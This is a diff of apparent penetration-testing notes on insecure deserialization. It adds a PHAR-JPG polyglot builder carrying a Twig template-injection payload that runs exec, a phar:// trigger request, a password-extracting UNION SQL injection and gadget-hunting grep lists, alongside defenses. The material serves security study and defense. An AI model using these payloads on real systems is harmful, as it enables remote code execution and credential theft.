+require()          stat()                 mime_content_type()
 ```
 
-These are common gadget candidates.
+`file_exists()` is particularly useful because it is commonly used to check avatar/image paths — less likely to have strict protections compared to `include()` or `fopen()`.
+
+### Attack Flow
+
+**1. Create a PHAR-JPG polyglot:**
+
+The PHAR file must pass the application's image validation (magic bytes, file structure). A PHAR-JPG polyglot is simultaneously a valid JPEG and a PHAR archive — it passes image validation but is parsed as a PHAR when accessed via `phar://`.
+
+PHAR payload construction (PHP):
+```php
+class CustomTemplate {}
+class Blog {}
+
+$object = new CustomTemplate;
+$blog = new Blog;
+$blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}';
+$blog->user = 'user';
+$object->template_file_path = $blog;
+
+// Create PHAR
+$phar = new Phar('exploit.phar');
+$phar->startBuffering();
+$phar->addFromString('test.txt', 'test');
+$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");  // JPEG magic bytes + PHAR stub
+$phar->setMetadata($object);     // gadget chain object stored as serialized metadata
+$phar->stopBuffering();
+rename('exploit.phar', 'exploit.jpg');
+```
+
+**2. Upload the polyglot as a profile picture** — passes image validation because JPEG magic bytes are present.
+
+**3. Trigger deserialization:**
+
+Change the file access request to use the `phar://` wrapper:
+```
+GET /cgi-bin/avatar.php?avatar=phar://wiener
+```
+
+The avatar loading code calls `file_exists("phar://wiener.jpg")` — PHP parses the PHAR, deserializes the metadata, the gadget chain fires.
+
+> **Attacker note:** Any user-controlled path that feeds into a filesystem function is a PHAR trigger candidate — avatar loading, file preview, document processing, backup restoration. The `phar://` scheme works regardless of file extension. A file named `exploit.jpg` is processed as a PHAR when accessed via `phar://exploit.jpg`.
 
 ---
 
-### What To Observe
+## 9. Memory Corruption via Deserialization
 
-Indicators include:
+Even without a discovered gadget chain, deserialization functions themselves expose attack surface for memory corruption vulnerabilities.
 
-```text
-Unexpected Responses
-Application Errors
-Class Not Found Errors
-Different Application Behavior
-```
+PHP's `unserialize()` and equivalent functions in other languages are complex parsers that have historically contained memory corruption bugs — buffer overflows, use-after-free conditions, integer overflows in length handling.
 
----
+Publicly documented memory corruption CVEs against deserialization functions can achieve remote code execution without any application-level gadget chain. The vulnerability is in the deserialization runtime itself.
 
-### Why This Technique Matters
-
-Most real-world Remote Code Execution deserialization vulnerabilities originate from:
-
-```text
-Arbitrary Object Injection
-        ↓
-Magic Method Execution
-        ↓
-Gadget Chain
-        ↓
-Dangerous Sink
-        ↓
-RCE
-```
-
-This technique forms the foundation of most advanced deserialization exploits.
-
-
----
-# Magic Methods
-
-## Overview
-
-Magic methods are special methods that execute automatically when specific events occur.
-
-Unlike normal methods:
-
-```php
-$user->login();
-```
-
-developers do not call magic methods directly.
-
-PHP automatically invokes them when certain actions occur.
-
-Examples:
-
-```php
-Object Created
-Object Destroyed
-Object Deserialized
-Object Converted To String
-```
-
-This automatic execution makes magic methods extremely important in deserialization vulnerabilities.
-
-When an application deserializes attacker-controlled objects, magic methods may execute before the application performs any validation or authorization checks.
-
-As a result:
-
-```text
-Attacker-Controlled Object
-            ↓
-      Deserialization
-            ↓
-     Magic Method Executes
-            ↓
-     Application Logic Runs
-```
-
-Many deserialization vulnerabilities begin with a magic method.
+**Key implication:** An application that believes it has eliminated all gadget chains may still be exploitable via a memory corruption vulnerability in the deserialization library. This is why the only truly safe mitigation is to never deserialize untrusted data.
 
 ---
 
-## Why Magic Methods Matter
+## 10. Chaining Deserialization with Secondary Vulnerabilities
 
-Consider a normal application flow.
+Custom gadget chains often pass attacker-controlled data through multiple intermediate steps. Each step is a potential injection point for a secondary vulnerability.
 
-A developer may write:
+### SQLi via Deserialization (Java)
 
-```php
-$user->deleteAvatar();
+**Scenario:** A `readObject()` implementation passes an object attribute into a SQL query:
+
+```java
+private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
+    in.defaultReadObject();
+    // id is passed directly into a SQL query during deserialization
+    Connection conn = getDbConnection();
+    PreparedStatement stmt = conn.prepareStatement(
+        "SELECT * FROM products WHERE id = '" + this.id + "'"  // vulnerable concatenation
+    );
+}
 ```
 
-The method only executes because the developer explicitly called it.
+The `id` field is attacker-controlled (set in the serialized object). Injecting a SQL payload into `id` causes SQL injection to fire during deserialization — before the application code processes the object.
 
-With magic methods:
-
-```php
-__wakeup()
-__destruct()
-__toString()
+**Error-based extraction via UNION:**
+```sql
+' UNION SELECT NULL, NULL, NULL, CAST(password AS numeric), NULL, NULL, NULL, NULL FROM users--
 ```
 
-execution happens automatically.
+The type mismatch (`CAST password AS numeric`) causes an error that includes the password value in the error message — returned in the HTTP response.
 
-The application may never explicitly call these methods.
+### SSTI via Deserialization (PHP + Twig)
 
-PHP calls them internally.
+**Scenario:** A gadget chain eventually passes data into a template engine call. If the application uses Twig and an attacker-controlled string is passed as template content:
 
-This creates situations where attacker-controlled data reaches dangerous functionality without any user-accessible feature exposing it.
+```
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+```
+
+This Twig SSTI payload registers `exec` as a filter callback and invokes it with the command — achieving RCE through the template engine rather than directly.
+
+The combined chain: `__wakeup()` → object attribute → Twig render call → SSTI → `exec()`.
 
 ---
 
-## Common PHP Magic Methods
+## 11. Impact Assessment
 
-### Object Creation
+| Condition | Impact |
+|-----------|--------|
+| Attribute modification only | Privilege escalation, authentication bypass |
+| Application functionality abuse | Arbitrary file deletion, path traversal |
+| Arbitrary object injection + magic methods | Arbitrary code execution during deserialization |
+| Pre-built gadget chain available | RCE with low effort |
+| Custom gadget chain required | RCE with source code access |
+| PHAR deserialization | RCE without `unserialize()` call in code |
+| Memory corruption | RCE regardless of gadget chain availability |
+| Secondary SQLi via gadget | Database exfiltration on top of RCE |
+| Secondary SSTI via gadget | RCE through alternative path |
 
-```php
-__construct()
-```
+### Severity Factors
 
-Executed when an object is created.
-
-Example:
-
-```php
-$user = new User();
-```
-
-PHP automatically calls:
-
-```php
-__construct()
-```
-
----
-
-### Deserialization
-
-```php
-__wakeup()
-```
-
-Executed immediately after:
-
-```php
-unserialize()
-```
-
-reconstructs an object.
-
-Example:
-
-```php
-$user = unserialize($cookie);
-```
-
-PHP automatically executes:
-
-```php
-__wakeup()
-```
-
-before normal application processing continues.
-
-This makes `__wakeup()` one of the most valuable targets during deserialization testing.
+| Factor | Lower | Higher |
+|--------|-------|--------|
+| Source code access | No | Yes — enables custom chains |
+| Libraries used | Niche/custom | CommonCollections, Spring, Symfony, Laravel |
+| Magic methods present | None | `__wakeup()`, `readObject()`, `__destruct()` |
+| Sink gadgets reachable | None | `exec()`, `unlink()`, SQL query |
+| Filesystem functions used | None | `file_exists()`, `fopen()` on user paths |
+| Post-deserialization checks | Signature verified before deserialization | Signature checked after or not at all |
 
 ---
 
-### Object Destruction
+## 12. Defense & Prevention
 
-```php
-__destruct()
+### Core Principle
+
+**Do not deserialize untrusted user input.** This is the only complete fix. All other mitigations reduce severity or increase attack difficulty — they do not eliminate the vulnerability class.
+
+### 1. Avoid Deserializing User-Controlled Data Entirely
+
+Redesign features that currently rely on serialized objects. Use structured data formats (JSON, XML) with explicit schema validation for data that must be transmitted to clients. JSON does not carry executable class information — it cannot trigger magic methods or gadget chains.
+
+```python
+# Instead of serializing a User object into a cookie:
+# VULNERABLE
+cookie = base64(serialize(user_object))
+
+# SAFE — store only an opaque identifier; look up state server-side
+session_id = generate_secure_random_token()
+server_side_session_store[session_id] = user_data
+cookie = session_id
 ```
 
-Executed when PHP destroys an object.
+### 2. Sign and Verify Serialized Data Before Deserialization
 
-This commonly occurs:
+If serialization cannot be avoided, attach a cryptographic signature (HMAC) to detect tampering. Verify the signature **before** calling the deserialization function — not after.
 
-```text
-End Of Request
-Object Reassignment
-Memory Cleanup
+```python
+import hmac, hashlib, base64
+
+SECRET_KEY = b"long-random-secret"
+
+def serialize_signed(obj):
+    data = base64.b64encode(serialize(obj))
+    sig = hmac.new(SECRET_KEY, data, hashlib.sha256).hexdigest()
+    return data + b"." + sig.encode()
+
+def deserialize_verified(token):
+    data, sig = token.rsplit(b".", 1)
+    expected = hmac.new(SECRET_KEY, data, hashlib.sha256).hexdigest()
+    if not hmac.compare_digest(sig.decode(), expected):
+        raise ValueError("Signature verification failed")
+    return deserialize(base64.b64decode(data))
 ```
 
-Developers frequently place cleanup logic inside destructors.
+> **Critical:** If the secret key leaks (via debug endpoints, error messages, configuration exposure), the signature provides no protection. Signing is a second-layer control, not a primary one.
 
-Examples:
+### 3. Use Class Allowlists for Deserialization
 
-```php
-Delete Temporary Files
-Close Database Connections
-Write Logs
-Remove Cached Files
-```
+Restrict deserialization to only the expected class. If the incoming data represents anything else, reject it before instantiation.
 
-If attacker-controlled properties influence this logic:
-
-```text
-File Deletion
-File Write
-Command Execution
-```
-
-may become possible.
-
----
-
-### String Conversion
-
-```php
-__toString()
-```
-
-Executed when an object is treated as a string.
-
-Example:
-
-```php
-echo $object;
-```
-
-PHP automatically calls:
-
-```php
-__toString()
-```
-
-The application may never directly invoke the method.
-
-Certain framework operations may trigger it automatically.
-
----
-
-## Deserialization Example
-
-Consider the following class:
-
-```php
-class User
-{
-    public $username;
-
-    function __wakeup()
-    {
-        logAccess($this->username);
+**Java — using `ObjectInputFilter` (Java 9+):**
+```java
+ObjectInputStream ois = new ObjectInputStream(inputStream);
+ois.setObjectInputFilter(filterInfo -> {
+    Class<?> clazz = filterInfo.serialClass();
+    if (clazz != null && !ALLOWED_CLASSES.contains(clazz.getName())) {
+        return ObjectInputFilter.Status.REJECTED;
     }
+    return ObjectInputFilter.Status.ALLOWED;
+});
+```
+
+**PHP — check class before using the object (limited protection):**
+```php
+$obj = unserialize($data);  // object already instantiated — magic methods already fired
+if (!($obj instanceof ExpectedClass)) {
+    throw new Exception("Unexpected class");
 }
 ```
 
-During deserialization:
+> **Limitation:** In PHP, the check comes after `unserialize()` — magic methods have already executed. Class filtering after the fact does not prevent `__wakeup()` and `__destruct()` from firing. Java's `ObjectInputFilter` is more effective because it rejects classes before instantiation.
+
+### 4. Keep Dependencies Up to Date
+
+Gadget chains rely on specific versions of libraries containing exploitable code. Updating dependencies removes known gadget chain targets. Monitor security advisories for serialization-related CVEs in all libraries the application imports.
+
+### 5. Disable PHAR Deserialization (PHP)
+
+If PHAR functionality is not needed, disable the `phar://` stream wrapper to eliminate this attack path:
+
+```ini
+; php.ini
+phar.readonly = On          ; prevents creating new PHAR archives
+```
+
+For applications that do not use PHAR at all, consider disabling the phar extension entirely or using a wrapper-blocking approach at the filesystem operation level.
+
+### 6. Never Expose Backup or Source Files
+
+`.php~`, `.php.bak`, `.php.swp`, `.bak` files reveal class definitions that enable custom gadget chain construction. Configure the web server to deny access to these patterns:
+
+```apache
+# Apache — block backup file extensions
+<FilesMatch "\.(php~|php\.bak|bak|swp|old|orig)$">
+    Require all denied
+</FilesMatch>
+```
+
+---
+
+## 13. Quick Reference Cheat Sheet
+
+### Signs a Deserialization Vulnerability May Be Present
+
+- Session cookie contains `O:` prefix (PHP) or `rO0` / `AC ED` (Java base64/hex)
+- Cookie value is Base64-encoded — decode it and check for serialized format markers
+- Cookie or parameter changes cause unexpected server errors or changed behavior
+- Application source or backup files accessible via `.php~` or `.bak` extension
+- Error messages reference class names, `unserialize()`, `readObject()`, or `Marshal`
+- Response includes class-specific error messages (Java stack traces naming serializable classes)
+
+### PHP Serialized Object — Manual Edit Checklist
+
+```
+1. Decode the cookie: URL-decode → Base64-decode
+2. Identify the attribute to modify
+3. Change the value
+4. Update the type prefix if changing type (s: → i: → b:)
+5. Update the length indicator for string values (s:6:"carlos" → s:5:"admin" if length changes)
+6. Re-encode: Base64-encode → URL-encode
+7. Submit as the cookie
+```
+
+### PHP Format Reference
 
 ```php
-$user = unserialize($data);
-```
-
-PHP performs:
-
-```text
-Deserialize Object
-        ↓
-Restore Properties
-        ↓
-Execute __wakeup()
-```
-
-The developer never explicitly called:
-
-```php
-__wakeup()
-```
-
-PHP executes it automatically.
-
----
-
-## Dangerous Magic Methods
-
-Not every magic method is dangerous.
-
-A magic method becomes interesting when it performs operations using attacker-controlled properties.
-
-Example:
-
-```php
-class FileManager
-{
-    public $file;
-
-    function __destruct()
-    {
-        unlink($this->file);
-    }
-}
-```
-
-Attacker controls:
-
-```php
-$this->file
-```
-
-through the serialized object.
-
-Example payload:
-
-```php
-O:11:"FileManager":1:{
-s:4:"file";
-s:20:"/var/www/config.php";
-}
-```
-
-At the end of the request:
-
-```php
-__destruct()
-```
-
-executes automatically.
-
-PHP performs:
-
-```php
-unlink("/var/www/config.php");
-```
-
-Result:
-
-```text
-Arbitrary File Deletion
-```
-
----
-
-## What Makes A Magic Method Exploitable
-
-A magic method becomes exploitable when:
-
-```text
-Magic Method
-        ↓
-Attacker-Controlled Property
-        ↓
-Dangerous Operation
-```
-
-exists.
-
-Example:
-
-```php
-function __destruct()
-{
-    unlink($this->file);
-}
-```
-
-Source:
-
-```php
-$this->file
-```
-
-Sink:
-
-```php
-unlink()
-```
-
-Result:
-
-```text
-File Deletion
-```
-
----
-
-## Common Dangerous Operations
-
-### Command Execution
-
-```php
-system()
-exec()
-shell_exec()
-passthru()
-```
-
-Impact:
-
-```text
-Remote Code Execution
-```
-
----
-
-### File Operations
-
-```php
-unlink()
-file_put_contents()
-fopen()
-```
-
-Impact:
-
-```text
-File Read
-File Write
-File Delete
-```
-
----
-
-### Code Execution
-
-```php
-eval()
-include()
-require()
-```
-
-Impact:
-
-```text
-Code Execution
-Local File Inclusion
-```
-
----
-
-### Network Operations
-
-```php
-curl_exec()
-file_get_contents()
-```
-
-Impact:
-
-```text
-SSRF
-Internal Network Access
-```
-
----
-
-## Pentesting Methodology
-
-When source code is available:
-
-### Step 1
-
-Identify magic methods.
-
-Search for:
-
-```php
-__construct()
-__wakeup()
-__destruct()
-__toString()
-```
-
----
-
-### Step 2
-
-Identify attacker-controlled properties.
-
-Examples:
-
-```php
-$file
-$url
-$template
-$command
-$path
-```
-
----
-
-### Step 3
-
-Trace property usage.
-
-Determine where the property eventually reaches.
-
-Example:
-
-```php
-$this->file
-        ↓
-unlink()
-```
-
----
-
-### Step 4
-
-Identify dangerous sinks.
-
-Examples:
-
-```php
-system()
-exec()
-eval()
-unlink()
-include()
-```
-
----
-
-### Step 5
-
-Determine exploitability.
-
-Ask:
-
-```text
-Can attacker control property?
-Can attacker trigger magic method?
-Can attacker influence sink?
-```
-
-If all answers are:
-
-```text
-Yes
-```
-
-the magic method may become part of an exploit chain.
-
----
-
-## Relationship To Gadget Chains
-
-Magic methods rarely cause Remote Code Execution by themselves.
-
-Most real-world exploitation follows:
-
-```text
-Deserialization
-        ↓
-Magic Method
-        ↓
-Additional Methods
-        ↓
-Dangerous Sink
-        ↓
-RCE
-```
-
-This sequence is called a:
-
-```text
-Gadget Chain
-```
-
-Magic methods are commonly the entry point into that chain.
-
-Without them, many deserialization exploit chains would never execute.
-
----
-
-# Gadget Chains
-
-## Overview
-
-A gadget chain is a sequence of existing methods that process attacker-controlled data until it reaches a dangerous function.
-
-The attacker does not create the chain.
-
-The chain already exists inside:
-
-```text
-Application Code
-Framework Code
-Third-Party Libraries
-Dependencies
-```
-
-The attacker simply discovers a path through the existing codebase.
-
----
-
-## Why Gadget Chains Exist
-
-Modern applications contain thousands of classes.
-
-Each class contains:
-
-```text
-Properties
-Methods
-Business Logic
-```
-
-Developers build these classes to perform legitimate functionality.
-
-Examples:
-
-```text
-File Processing
-Logging
-Caching
-Template Rendering
-Database Operations
-Image Processing
-```
-
-Individually these classes may appear harmless.
-
-However, when connected together they may form an execution path that allows attacker-controlled data to reach dangerous functionality.
-
-This execution path is called a gadget chain.
-
----
-
-## Understanding The Concept
-
-Consider the following class:
-
-```php
-class Logger
-{
-    public $file;
-
-    function writeLog()
-    {
-        file_put_contents($this->file,"test");
-    }
-}
-```
-
-By itself:
-
-```text
-Not Vulnerable
-```
-
-The method simply writes a log file.
-
-Now consider another class:
-
-```php
-class User
-{
-    public $logger;
-
-    function __destruct()
-    {
-        $this->logger->writeLog();
-    }
-}
-```
-
-Again:
-
-```text
-Not Vulnerable
-```
-
-The developer is simply writing logs when the object is destroyed.
-
-However:
-
-```text
-__destruct()
-        ↓
-writeLog()
-        ↓
-file_put_contents()
-```
-
-forms a chain.
-
-If the attacker controls:
-
-```php
-$logger->file
-```
-
-the application may now write arbitrary files.
-
-The vulnerability does not exist in a single method.
-
-The vulnerability exists in the interaction between multiple methods.
-
----
-
-## Simplified Example
-
-```text
-__wakeup()
-      ↓
-process()
-      ↓
-validate()
-      ↓
-executeCommand()
-```
-
-Attacker controls:
-
-```text
-Input Data
-```
-
-Application provides:
-
-```text
-Entire Chain
-```
-
-The attacker only supplies the starting object.
-
-The application executes the rest.
-
----
-
-## Relationship To Magic Methods
-
-Most gadget chains begin with a magic method.
-
-Example:
-
-```text
-Deserialization
-        ↓
-__wakeup()
-        ↓
-process()
-        ↓
-execute()
-        ↓
-system()
-```
-
-or:
-
-```text
-Deserialization
-        ↓
-__destruct()
-        ↓
-cleanup()
-        ↓
-unlink()
-```
-
-The magic method acts as the trigger.
-
-The remaining methods form the chain.
-
----
-
-## Components Of A Gadget Chain
-
-Every gadget chain contains three components.
-
-### Source
-
-Attacker-controlled data.
-
-Example:
-
-```php
-$this->file
-$this->command
-$this->template
-$this->url
-```
-
-The attacker controls the value.
-
----
-
-### Propagation
-
-Methods that pass attacker-controlled data through the application.
-
-Example:
-
-```text
-__wakeup()
-      ↓
-process()
-      ↓
-validate()
-      ↓
-render()
-```
-
-Each method moves the data closer to a dangerous operation.
-
----
-
-### Sink
-
-The final dangerous operation.
-
-Examples:
-
-```php
-system()
-exec()
-eval()
-include()
-unlink()
-file_put_contents()
-```
-
-Once attacker-controlled data reaches the sink, exploitation becomes possible.
-
----
-
-## Dangerous Sinks
-
-### Command Execution
-
-```php
-system()
-exec()
-shell_exec()
-passthru()
-```
-
-Impact:
-
-```text
-Remote Code Execution
-```
-
----
-
-### File Operations
-
-```php
-unlink()
-file_put_contents()
-fopen()
-rename()
-copy()
-```
-
-Impact:
-
-```text
-File Read
-File Write
-File Delete
-```
-
----
-
-### Code Execution
-
-```php
-eval()
-include()
-require()
-include_once()
-```
-
-Impact:
-
-```text
-Code Execution
-Local File Inclusion
-```
-
----
-
-### Network Operations
-
-```php
-curl_exec()
-file_get_contents()
-fsockopen()
-```
-
-Impact:
-
-```text
-SSRF
-Internal Network Access
-```
-
----
-
-### Database Operations
-
-```php
-query()
-execute()
-prepare()
-```
-
-Impact:
-
-```text
-SQL Injection
-Data Manipulation
-```
-
----
-
-## Real-World Example
-
-Consider:
-
-```php
-class ImageProcessor
-{
-    public $path;
-
-    function process()
-    {
-        unlink($this->path);
-    }
-}
-```
-
-Another class:
-
-```php
-class User
-{
-    public $processor;
-
-    function __destruct()
-    {
-        $this->processor->process();
-    }
-}
-```
-
----
-
-### Normal Application Flow
-
-```text
-Object Destroyed
-        ↓
-__destruct()
-        ↓
-process()
-        ↓
-unlink()
-```
-
-Developer intends:
-
-```text
-Delete Temporary Image
-```
-
----
-
-### Attacker Flow
-
-Attacker controls:
-
-```php
-$path
-```
-
-Serialized object:
-
-```php
-O:13:"ImageProcessor":1:{
-s:4:"path";
-s:20:"/var/www/config.php";
-}
-```
-
-Application executes:
-
-```php
-unlink("/var/www/config.php");
-```
-
-Result:
-
-```text
-Arbitrary File Deletion
-```
-
----
-
-## Why Frameworks Are Common Targets
-
-Frameworks contain:
-
-```text
-Hundreds Of Classes
-Thousands Of Methods
-Complex Object Relationships
-```
-
-This dramatically increases gadget availability.
-
-Examples:
-
-```text
-Laravel
-Symfony
-WordPress
-Drupal
-Spring
-Struts
-Rails
-```
-
-Many documented deserialization vulnerabilities exploit framework gadget chains rather than application code.
-
----
-
-## Gadget Chain Discovery
-
-When source code is available:
-
-### Step 1
-
-Identify magic methods.
-
-Search for:
-
-```php
-__wakeup()
-__destruct()
-__toString()
-```
-
----
-
-### Step 2
-
-Trace execution flow.
-
-Example:
-
-```text
-__destruct()
-      ↓
-process()
-      ↓
-writeLog()
-      ↓
-file_put_contents()
-```
-
----
-
-### Step 3
-
-Identify attacker-controlled properties.
-
-Examples:
-
-```php
-$file
-$path
-$url
-$template
-$command
-```
-
----
-
-### Step 4
-
-Determine whether attacker-controlled properties reach dangerous sinks.
-
-Example:
-
-```text
-$file
-      ↓
-writeLog()
-      ↓
-file_put_contents()
-```
-
-If attacker controls:
-
-```php
-$file
-```
-
-the sink becomes reachable.
-
----
-
-## Black-Box Testing
-
-Without source code:
-
-### Look For
-
-```text
-Application Errors
-Class Names
-Framework Names
-Library Names
-Stack Traces
-```
-
-These often reveal available gadgets.
-
----
-
-### Identify Frameworks
-
-Examples:
-
-```text
-Laravel
-Symfony
-Monolog
-Spring
-CommonsCollections
-Rails
-```
-
-Known gadget chains may already exist.
-
----
-
-### Test Existing Gadget Chains
-
-Common tools:
+// Boolean
+b:0;          // false
+b:1;          // true
 
-```text
-PHPGGC
-ysoserial
-```
-
-These tools contain pre-built gadget chains for many frameworks.
-
-The goal is not to build a chain manually.
-
-The goal is to determine whether a known chain already exists.
-
----
-
-## Common Impacts
-
-### File Operations
-
-```text
-File Read
-File Write
-File Delete
-```
-
----
-
-### Network Operations
-
-```text
-SSRF
-Internal Network Access
-```
-
----
-
-### Application Compromise
-
-```text
-Authentication Bypass
-Authorization Bypass
-Privilege Escalation
-```
-
----
-
-### Code Execution
-
-```text
-Remote Code Execution
-Web Shell Upload
-Server Compromise
-```
-
----
-
-## Key Concept
-
-Most deserialization vulnerabilities do not directly lead to Remote Code Execution.
-
-The usual path is:
-
-```text
-Attacker-Controlled Object
-            ↓
-      Deserialization
-            ↓
-      Magic Method
-            ↓
-       Gadget Chain
-            ↓
-      Dangerous Sink
-            ↓
-Remote Code Execution
-```
-
-The attacker supplies the object.
-
-The application supplies the chain.
-
-The sink determines the impact.
-
-
----
-
-# Black-Box Detection
-
-## Response Differences
-
-Modify serialized object.
-
-Observe:
-
-```text
-Different responses
-Different privileges
-Different content
-```
-
----
-
-## Deserialization Errors
-
-Common indicators:
-
-```text
-Invalid object
-Serialization exception
-Unexpected object type
-Class not found
-```
-
----
-
-## Collaborator Testing
-
-Useful against blind deserialization.
-
-Generate payload causing:
-
-```text
-DNS Interaction
-HTTP Interaction
-TCP Interaction
-```
-
-Observe external callback.
-
----
-
-# Common Tools
-
-## Burp Suite
-
-### Features
-
-```text
-Repeater
-Decoder
-Inspector
-Collaborator
-```
-
----
-
-## ysoserial
+// Integer
+i:42;
 
-Used for:
+// String (length must match)
+s:5:"admin";
 
-```text
-Java Gadget Chains
-Java RCE Payloads
-Detection Payloads
-```
-
----
-
-## PHPGGC
-
-Used for:
-
-```text
-PHP Gadget Chains
-Laravel Chains
-Symfony Chains
-Monolog Chains
-```
-
----
-
-# PHAR Deserialization
-
-## Overview
-
-PHP can deserialize metadata stored inside PHAR archives.
-
-Developer may never call:
-
-```php
-unserialize()
-```
-
-directly.
-
-Deserialization still occurs.
-
----
-
-## Example
-
-```php
-file_exists()
-fopen()
-include()
-```
-
-used with:
-
-```php
-phar://
-```
-
-can trigger deserialization.
-
----
-
-## Typical Attack Flow
-
-```text
-Upload PHAR
-        ↓
-Disguise As JPG
-        ↓
-Application Reads File
-        ↓
-PHAR Metadata Deserialized
-        ↓
-Magic Method Triggered
-        ↓
-Gadget Chain Executes
-```
-
----
-
-# Common Impacts
+// Object
+O:4:"User":2:{s:4:"name";s:6:"carlos";s:7:"isAdmin";b:0;}
+//  ↑ class name length
+//        ↑ class name
+//               ↑ attribute count
 
-## Authentication Bypass
-
-```text
-Role Manipulation
-Token Manipulation
-Admin Access
-```
-
----
-
-## Authorization Bypass
-
-```text
-Privilege Escalation
-IDOR Expansion
-Admin Functions
-```
-
----
-
-## Arbitrary File Access
-
-```text
-Read Files
-Delete Files
-Overwrite Files
-```
-
----
-
-## Remote Code Execution
-
-```text
-PHP
-Java
-Ruby
-Python
+// Null
+N;
 ```
-
----
 
-## Server Compromise
+### Java Detection Markers
 
-```text
-Shell Access
-Persistence
-Data Theft
-```
+| Encoding | Marker |
+|----------|--------|
+| Raw binary | First two bytes: `AC ED` |
+| Base64 | Starts with: `rO0` |
+| Hex | Starts with: `aced0005` |
 
----
+### Magic Method Execution Timing
 
-# Testing Workflow
+| Language | Method | When |
+|----------|--------|------|
+| PHP | `__wakeup()` | Immediately on `unserialize()` |
+| PHP | `__destruct()` | End of request / garbage collection |
+| PHP | `__toString()` | When object used as string |
+| PHP | `__get($n)` | When undefined property read |
+| Java | `readObject()` | During `ObjectInputStream.readObject()` |
+| Java | `finalize()` | Garbage collection |
+| Ruby | `marshal_load()` | During `Marshal.load()` |
 
-Identify serialized data.
+### Pre-Built Chain Tooling
 
----
+| Target | Chain Tool | Detection Chain | RCE Chain Example |
+|--------|-----------|-----------------|-------------------|
+| Java (generic) | ysoserial | `URLDNS` (DNS), `JRMPClient` (TCP) | `CommonsCollections4` |
+| PHP Symfony | PHPGGC | — | `Symfony/RCE4` |
+| PHP Laravel | PHPGGC | — | `Laravel/RCE1` |
+| PHP Guzzle | PHPGGC | — | `Guzzle/FW1` |
 
-Determine serialization format.
+### Custom Gadget Chain Hunt — What to Look For
 
-```text
-PHP
-Java
-Ruby
-Python
 ```
-
----
-
-Confirm user control.
-
----
-
-Modify attributes.
-
----
-
-Modify data types.
+Source code:
+  1. grep -r "unserialize"           → PHP deserialization sinks
+  2. grep -r "readObject"            → Java deserialization sinks
+  3. grep -r "__wakeup\|__destruct"  → kick-off magic methods (PHP)
+  4. grep -r "implements Serializable" → serializable Java classes
+  5. grep -r "exec\|system\|eval\|unlink\|file_put_contents"  → sink gadgets
 
----
+Backup/source exposure:
+  Add ~ or .bak to any .php filename in the site map
+  Check /libs/, /includes/, /classes/ directories
 
-Look for dangerous properties.
-
-```text
-role
-isAdmin
-file_path
-template
-url
-command
+Sink gadgets to find in the chain:
+  exec(), system(), passthru(), shell_exec()   → OS command execution
+  unlink(), rename(), copy()                   → filesystem write/delete
+  file_put_contents()                          → write arbitrary files
+  eval()                                       → code execution
+  SQL query construction with string concat    → SQLi
+  template render with user data              → SSTI
 ```
-
----
-
-Test arbitrary object injection.
-
----
 
-Identify magic methods. 
+### PHAR Attack Prerequisites
 
-```text
-__wakeup()
-__destruct()
-readObject()
 ```
-
----
-
-Look for gadget chains.
-
----
-
-Escalate to:
+1. Application deserializes user-controllable data (via phar:// trigger, not necessarily explicit unserialize())
+2. Application performs a filesystem operation on a user-controlled path
+3. Attacker can upload files to the server (any upload vector)
+4. Application uses a gadget-chain-containing class
 
-```text
-Privilege Escalation
-File Access
-RCE
+Attack:
+  Create PHAR with gadget chain in metadata → disguise as permitted file type
+  → Upload → trigger filesystem function with phar:// path
 ```
